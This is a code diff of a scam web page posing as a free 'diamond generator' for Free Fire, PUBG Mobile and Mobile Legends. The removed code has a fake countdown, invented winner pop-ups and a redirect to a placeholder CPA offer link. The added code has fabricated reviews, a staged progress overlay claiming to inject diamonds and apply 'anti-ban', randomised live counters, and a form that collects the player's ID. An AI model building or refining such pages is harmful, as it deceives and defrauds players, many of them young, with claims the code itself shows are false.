+                    <div class="comment-stars">⭐⭐⭐⭐</div>
+                </div>
+                <div class="comment-text">Works on Mobile Legends too! Got my diamonds after 6 hours. Just be patient guys, it will come 🙏</div>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Processing Overlay -->
+    <div class="overlay" id="overlay">
+        <div class="overlay-card">
+            <div class="overlay-icon" id="overlayIcon">⏳</div>
+            <div class="overlay-title" id="overlayTitle">Processing...</div>
+            <div class="overlay-text" id="overlayText">Please wait while we generate your diamonds.</div>
+            <div class="overlay-steps" id="overlaySteps">
+                <div><span class="check">✅</span> Game: <strong id="ovGame">Free Fire</strong></div>
+                <div><span class="check">✅</span> Player ID: <strong id="ovId">-</strong></div>
+                <div><span class="pending">⏳</span> Connecting to server...</div>
+                <div><span class="pending">⏳</span> Injecting diamonds...</div>
+            </div>
+            <div class="progress-bar-wrap">
+                <div class="progress-bar-fill" id="overlayProgress" style="width:0%"></div>
+            </div>
+        </div>
+    </div>
 
     <!-- Footer -->
-    <footer class="p-12 text-center text-gray-600 text-sm">
-        <p>&copy; 2026 Gaming Rewards Global Inc. All rights reserved.</p>
-        <p class="mt-2">This site is not affiliated with Roblox, Epic Games, or Garena.</p>
-    </footer>
+    <div class="footer">
+        <p>© 2026 DiamondGen. All rights reserved.</p>
+        <p>
+            <a href="#">Privacy Policy</a> |
+            <a href="#">Terms of Service</a> |
+            <a href="#">Contact</a> |
+            <a href="#">DMCA</a>
+        </p>
+        <p style="margin-top:5px; font-size:10px; color:#555;">
+            Disclaimer: This is a third-party tool. We are not affiliated with Garena, Tencent, or Moonton.
+        </p>
+    </div>
 
     <script>
-        // Timer Logic
-        let time = 594; // 9:54
-        const timerEl = document.getElementById('timer');
-        setInterval(() => {
-            let mins = Math.floor(time / 60);
-            let secs = time % 60;
-            timerEl.innerHTML = `${mins}:${secs < 10 ? '0' : ''}${secs}`;
-            if (time > 0) time--;
-        }, 1000);
+        // State
+        let selectedGame = 'freefire';
+        let selectedDiamonds = 500;
+        let playerId = '';
+        let server = '';
 
-        // Fake Notifications Logic
-        const users = ['Slayer_Pro', 'GamerGirl92', 'Shadow_King', 'Elite_Sniper', 'Dragon_Lord', 'Misty_Rose', 'Toxic_Vibe'];
-        const countries = ['USA', 'UK', 'Canada', 'Germany', 'France', 'Australia', 'Netherlands'];
-        const amounts = ['5,000', '10,000', '25,000', '50,000'];
-        
-        function showNotification() {
-            const notif = document.getElementById('notification');
-            document.getElementById('notif-user').innerText = users[Math.floor(Math.random() * users.length)];
-            document.getElementById('notif-country').innerText = countries[Math.floor(Math.random() * countries.length)];
-            notif.classList.add('show');
+        // Game Selection
+        function selectGame(card) {
+            document.querySelectorAll('.game-card').forEach(c => c.classList.remove('selected'));
+            card.classList.add('selected');
+            selectedGame = card.dataset.game;
+        }
+
+        // Diamond Selection
+        function selectDiamonds(opt) {
+            document.querySelectorAll('.diamond-opt').forEach(o => o.classList.remove('selected'));
+            opt.classList.add('selected');
+            selectedDiamonds = parseInt(opt.dataset.amount);
+            document.getElementById('successAmount').textContent = '+' + selectedDiamonds.toLocaleString() + ' 💎';
+        }
+
+        // Start Generation
+        function startGeneration() {
+            playerId = document.getElementById('playerId').value.trim();
+            server = document.getElementById('server').value;
+
+            if (!playerId) {
+                alert('Please enter your Player ID to continue.');
+                document.getElementById('playerId').focus();
+                return;
+            }
+            if (!server) {
+                alert('Please select your server/region.');
+                document.getElementById('server').focus();
+                return;
+            }
+
+            // Show overlay
+            document.getElementById('overlay').classList.add('show');
+            document.getElementById('ovId').textContent = playerId;
+            document.getElementById('ovGame').textContent = selectedGame === 'freefire' ? 'Free Fire' : selectedGame === 'pubg' ? 'PUBG Mobile' : 'Mobile Legends';
+
+            // Animate progress
+            simulateProgress();
+        }
+
+        function simulateProgress() {
+            const progressBar = document.getElementById('overlayProgress');
+            const steps = document.querySelectorAll('#overlaySteps .pending');
+            const icon = document.getElementById('overlayIcon');
+            const title = document.getElementById('overlayTitle');
+            const text = document.getElementById('overlayText');
+            
+            let progress = 0;
+            const stages = [
+                { pct: 15, delay: 800, stepIdx: 0, stepText: 'Connected', icon: '🔗', title: 'Connecting...', text: 'Establishing secure connection to game servers.' },
+                { pct: 35, delay: 1600, stepIdx: 1, stepText: 'Verified', icon: '🔍', title: 'Verifying Account...', text: 'Checking player ID and server region.' },
+                { pct: 55, delay: 2400, stepIdx: 2, stepText: 'Generating', icon: '⚙️', title: 'Generating Diamonds...', text: 'Injecting diamond packets into your account.' },
+                { pct: 75, delay: 3200, stepIdx: null, icon: '🛡️', title: 'Applying Anti-Ban...', text: 'Adding protection layers to avoid detection.' },
+                { pct: 90, delay: 4000, stepIdx: 3, stepText: 'Finalizing', icon: '📦', title: 'Finalizing...', text: 'Almost done! Preparing delivery.' },
+                { pct: 100, delay: 5000, stepIdx: null, icon: '✅', title: 'Complete!', text: 'Diamonds generated successfully!' },
+            ];
+
+            stages.forEach(stage => {
+                setTimeout(() => {
+                    progress = stage.pct;
+                    progressBar.style.width = progress + '%';
+                    
+                    if (stage.icon) icon.textContent = stage.icon;
+                    if (stage.title) title.textContent = stage.title;
+                    if (stage.text) text.textContent = stage.text;
+                    
+                    if (stage.stepIdx !== null && stage.stepIdx !== undefined) {
+                        const stepEl = steps[stage.stepIdx];
+                        if (stepEl) {
+                            stepEl.innerHTML = '<span class="check">✅</span> ' + stage.stepText;
+                            stepEl.classList.remove('pending');
+                            stepEl.classList.add('check');
+                        }
+                    }
+                }, stage.delay);
+            });
+
+            // Close overlay and show success
             setTimeout(() => {
-                notif.classList.remove('show');
-            }, 4000);
+                document.getElementById('overlay').classList.remove('show');
+                document.getElementById('progressSection').classList.add('show');
+                document.getElementById('progressBar').style.width = '100%';
+                document.getElementById('progressLabel').textContent = 'Diamonds Generated Successfully!';
+                document.getElementById('successBox').classList.add('show');
+                document.getElementById('successAmount').textContent = '+' + selectedDiamonds.toLocaleString() + ' 💎';
+                document.getElementById('btnGenerate').style.display = 'none';
+                
+                // Update dots
+                document.querySelectorAll('.step-dot').forEach(d => {
+                    d.classList.add('done');
+                    d.classList.remove('active');
+                });
+            }, 5500);
         }
 
-        setInterval(showNotification, 8000);
+        // Live counter rotation
+        setInterval(() => {
+            const online = document.getElementById('onlineCount');
+            const generated = document.getElementById('todayGenerated');
+            if (online) online.textContent = Math.floor(Math.random() * 2000 + 2000).toLocaleString();
+            if (generated) generated.textContent = Math.floor(Math.random() * 5000 + 10000).toLocaleString();
+        }, 5000);
 
-        // CTA Logic
-        function startProcess() {
-            alert("Connecting to server... Please wait.");
-            // Here you would redirect to your CPA offer link
-            window.location.href = "YOUR_CPA_OFFER_LINK_HERE";
-        }
+        // Auto-scroll to comments
+        console.log('%c⚠️ STOP! %cThis is a browser feature intended for developers. Do not paste any code here that you don\'t understand.', 'font-size:30px; color:red;', 'font-size:14px;');
     </script>
+
 </body>
 </html>
